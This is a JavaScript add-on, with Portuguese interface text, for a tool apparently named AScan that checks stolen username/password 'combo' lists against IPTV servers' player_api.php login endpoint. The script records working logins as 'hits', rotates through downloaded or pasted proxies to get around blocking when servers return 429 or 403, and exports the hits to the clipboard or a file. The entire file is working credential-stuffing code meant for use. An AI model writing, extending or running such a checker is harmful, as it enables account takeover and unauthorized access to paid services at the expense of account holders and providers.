(function(){
  if(window.__ascanFixV112) return; window.__ascanFixV112=1;

  function tmsg(m){ try{ if(typeof toast==='function') toast(m); }catch(e){} }
  function hasNative(){ return !!(window.AScanNative && typeof AScanNative.httpGet==='function'); }

  window.__ascanCbMap = window.__ascanCbMap || {};
  window.__ascanCb = function(id, b64){
    var cb = window.__ascanCbMap[id];
    if(!cb) return;
    delete window.__ascanCbMap[id];
    try{ cb(b64); }catch(e){}
  };

  function b64ToUtf8(b64){
    try{
      var bin = atob(b64);
      var bytes = new Uint8Array(bin.length);
      for(var i=0;i<bin.length;i++) bytes[i]=bin.charCodeAt(i);
      return new TextDecoder('utf-8').decode(bytes);
    }catch(e){
      try{ return decodeURIComponent(escape(atob(b64))); }catch(e2){ return ''; }
    }
  }

  function nativeHttpAsync(url, timeoutMs){
    return new Promise(function(resolve){
      if(!(window.AScanNative && typeof AScanNative.httpGetAsync==='function')){
        resolve({ok:false,status:0,error:'sem httpGetAsync',body:''});
        return;
      }
      var id = 'c' + Date.now().toString(36) + Math.random().toString(36).slice(2,8);
      var done = false;
      var timer = setTimeout(function(){
        if(done) return;
        done = true;
        delete window.__ascanCbMap[id];
        resolve({ok:false,status:0,error:'timeout',body:''});
      }, (timeoutMs|0) + 5000);
      window.__ascanCbMap[id] = function(b64){
        if(done) return;
        done = true;
        clearTimeout(timer);
        try{
          var txt = b64ToUtf8(b64);
          resolve(JSON.parse(txt));
        }catch(e){
          resolve({ok:false,status:0,error:String(e),body:''});
        }
      };
      try{
        AScanNative.httpGetAsync(url, timeoutMs|0, id);
      }catch(e){
        if(done) return;
        done = true;
        clearTimeout(timer);
        resolve({ok:false,status:0,error:String(e),body:''});
      }
    });
  }

  if(typeof fetchText==='function'){
    window.__origFetchText=fetchText;
    window.fetchText=async function(url,ms){
      if(hasNative()){
        try{
          var raw = AScanNative.httpGet(url, ms||25000);
          var j = JSON.parse(raw);
          if(j&&j.ok) return j.body||'';
          throw new Error((j&&(j.error||('HTTP '+j.status)))||'falha nativa');
        }catch(e){
          return window.__origFetchText(url,ms);
        }
      }
      return window.__origFetchText(url,ms);
    };
  }

  if(typeof testarNoServidor==='function'){
    window.__origTestar=testarNoServidor;
    window.testarNoServidor=async function(cred,servidor){
      if(hasNative() && window.AScanNative.httpGetAsync){
        var user=cred.user, pass=cred.pass, url=servidor.url;
        var api=url+'/player_api.php?username='+encodeURIComponent(user)+'&password='+encodeURIComponent(pass);
        try{
          var j=await nativeHttpAsync(api, 12000);
          if(window.state&&!state.isScanRunning) return {status:'stopped'};
          if(!j||j.status===429||j.status===403) return {status:'error',errorType:'block'};
          if(!j.ok||j.status!==200) return {status:'invalida'};
          var data; try{ data=JSON.parse(j.body||''); }catch(e){ return {status:'invalida'}; }
          if(!data||!data.user_info) return {status:'invalida'};
          if(String(data.user_info.status||'').toLowerCase()==='active') return {status:'hit',data:data};
          return {status:'invalida'};
        }catch(e){
          return {status:'error',errorType:'connection'};
        }
      }
      return window.__origTestar(cred,servidor);
    };
  }

  function refreshProxyStatus(){
    var el=document.getElementById('proxy-status');
    if(!el) return;
    try{
      if(hasNative() && AScanNative.getProxyStatus){
        var st=JSON.parse(AScanNative.getProxyStatus());
        el.textContent = (st.count>0) ? ('Proxy ON · '+st.count) : 'Sem proxy (direto)';
        el.className='combo-status '+(st.count>0?'ok':'');
        return;
      }
    }catch(e){}
    el.textContent='Sem proxy (direto)';
  }
  window.refreshProxyStatus=refreshProxyStatus;

  if(!document.getElementById('btn-proxy-online')){
    var actions=document.querySelector('.actions');
    var host=actions?actions.parentNode:document.body;
    var card=document.createElement('div');
    card.className='card';
    card.innerHTML='<div class="card-title">Proxy</div>'
      +'<div style="display:flex;gap:8px;flex-wrap:wrap;margin-bottom:10px">'
      +'<button type="button" class="btn btn-online" id="btn-proxy-online" style="flex:1;min-width:100px">Online</button>'
      +'<button type="button" class="btn btn-ghost" id="btn-proxy-offline" style="flex:1;min-width:100px">Offline</button>'
      +'<button type="button" class="btn btn-ghost" id="btn-proxy-clear" style="flex:1;min-width:100px">Limpar</button>'
      +'</div>'
      +'<div class="field"><label>Cole proxies offline (host:port)</label>'
      +'<textarea id="proxy-paste" rows="3" placeholder="1.2.3.4:8080" style="width:100%;background:var(--surface2);color:var(--text);border:1px solid var(--border);border-radius:9px;padding:10px;font-family:monospace;font-size:0.75rem"></textarea></div>'
      +'<div id="proxy-status" class="combo-status" style="margin-top:8px">Sem proxy (direto)</div>';
    if(actions) host.insertBefore(card, actions); else host.appendChild(card);
  }

  var bo=document.getElementById('btn-proxy-online');
  var bf=document.getElementById('btn-proxy-offline');
  var bc=document.getElementById('btn-proxy-clear');
  if(bo) bo.onclick=function(){
    if(!(window.AScanNative&&AScanNative.loadProxiesOnline)){ tmsg('Bridge ausente'); return; }
    tmsg('Baixando proxies (20-40s)...');
    setTimeout(function(){
      try{ var n=AScanNative.loadProxiesOnline(); refreshProxyStatus(); tmsg(n>0?('OK '+n+' proxies'):'Nenhum proxy'); }
      catch(e){ tmsg('Erro: '+e); }
    }, 40);
  };
  if(bf) bf.onclick=function(){
    var t=((document.getElementById('proxy-paste')||{}).value||'').trim();
    if(!t){ tmsg('Cole host:port'); return; }
    if(!(window.AScanNative&&AScanNative.loadProxiesFromText)){ tmsg('Bridge ausente'); return; }
    try{ var n=AScanNative.loadProxiesFromText(t); refreshProxyStatus(); tmsg(n>0?('OK '+n+' offline'):'Formato invalido'); }
    catch(e){ tmsg('Erro: '+e); }
  };
  if(bc) bc.onclick=function(){
    try{ if(window.AScanNative&&AScanNative.clearProxies) AScanNative.clearProxies(); }catch(e){}
    var el=document.getElementById('proxy-paste'); if(el) el.value='';
    refreshProxyStatus(); tmsg('Proxies limpos');
  };

  function allRaws(){
    try{ if(typeof getAllRaws==='function') return getAllRaws();
      var all=[]; if(window.state&&state.hitsLog){ for(var s in state.hitsLog) all=all.concat(state.hitsLog[s]); }
      return all; }catch(e){ return []; }
  }
  function rebind(sel, fn){
    var el=document.querySelector(sel); if(!el||!el.parentNode) return null;
    var n=el.cloneNode(true); el.parentNode.replaceChild(n,el);
    n.addEventListener('click',function(e){e.preventDefault();e.stopPropagation();fn(e);});
    return n;
  }
  function doCopy(){
    var h=allRaws(); if(!h||!h.length){ tmsg('Nenhum hit.'); return; }
    var text=h.join('\n\n');
    function ok(){ tmsg('Hits copiados!'); }
    if(navigator.clipboard&&navigator.clipboard.writeText){
      navigator.clipboard.writeText(text).then(ok).catch(function(){
        try{ var ta=document.createElement('textarea'); ta.value=text; document.body.appendChild(ta); ta.select(); document.execCommand('copy'); ta.remove(); ok(); }catch(e){ tmsg('Falha ao copiar'); }
      });
    } else {
      try{ var ta=document.createElement('textarea'); ta.value=text; document.body.appendChild(ta); ta.select(); document.execCommand('copy'); ta.remove(); ok(); }catch(e){ tmsg('Falha ao copiar'); }
    }
  }
  function doDownload(){
    var h=allRaws(); if(!h||!h.length){ tmsg('Nenhum hit.'); return; }
    var text='\uFEFF'+h.join('\n\n');
    var name='hits_AScan_'+(new Date().toISOString().slice(0,10))+'.txt';
    try{
      if(window.AScanNative && typeof AScanNative.saveText==='function'){
        AScanNative.saveText(name, text); tmsg('Salvo em Downloads'); return;
      }
    }catch(e){}
    tmsg('Use Copiar hits');
  }
  rebind('.btn-copy', doCopy);
  rebind('#btn-download', doDownload);

  rebind('.btn-start', function(){
    try{
      var srv=(document.getElementById('servidorUnico')||{}).value||'';
      if(!String(srv).trim()){ tmsg('Preencha o servidor!'); return; }
      var hasFile=false;
      try{ var f=document.getElementById('combo'); hasFile=f&&f.files&&f.files[0]; }catch(e){}
      var hasOnline=!!(window.loadedComboText);
      if(!hasFile && !hasOnline){ tmsg('Selecione combo ou use online!'); return; }
      if(typeof startAttack!=='function'){ tmsg('startAttack ausente'); return; }
      tmsg('Iniciando scan...');
      var p=startAttack();
      if(p&&typeof p.then==='function'){
        p.then(function(){ tmsg('Scan finalizado'); }).catch(function(err){ tmsg('Erro scan: '+err); });
      }
    }catch(err){
      tmsg('Erro ao iniciar: '+err);
    }
  });

  refreshProxyStatus();
  if(hasNative()) tmsg('AScan 1.1.3 OK');
})();
